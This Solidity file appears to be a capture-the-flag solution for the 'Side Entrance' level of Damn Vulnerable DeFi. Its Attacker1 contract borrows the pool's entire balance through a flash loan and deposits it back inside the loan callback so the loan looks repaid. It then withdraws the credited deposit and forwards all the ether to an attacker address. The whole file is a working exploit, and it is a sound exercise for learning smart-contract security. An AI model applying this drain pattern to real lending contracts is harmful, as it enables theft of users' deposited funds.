// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";


/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker1 {
    using Address for address payable;
        address pool;
        address attacker;
   constructor(address _pool,address _attacker){
       pool = _pool;
       attacker = _attacker;
   }


   function execute () external payable {
       console.log("IN EXECUTE");
           console.log(msg.value);
SideEntranceLenderPool(pool).deposit{value: msg.value}();
       //withdraw?
   }

   function attack() public {
        uint256 poolbalance = address(pool).balance;
        SideEntranceLenderPool(pool).flashLoan(poolbalance);
           SideEntranceLenderPool(pool).withdraw();

        // now we transfer received pool balance to the owner (attacker)
         payable(attacker).sendValue(address(this).balance);
   }
 receive () external payable {}
   function withdraw() external {
        SideEntranceLenderPool(pool).withdraw();
   }
}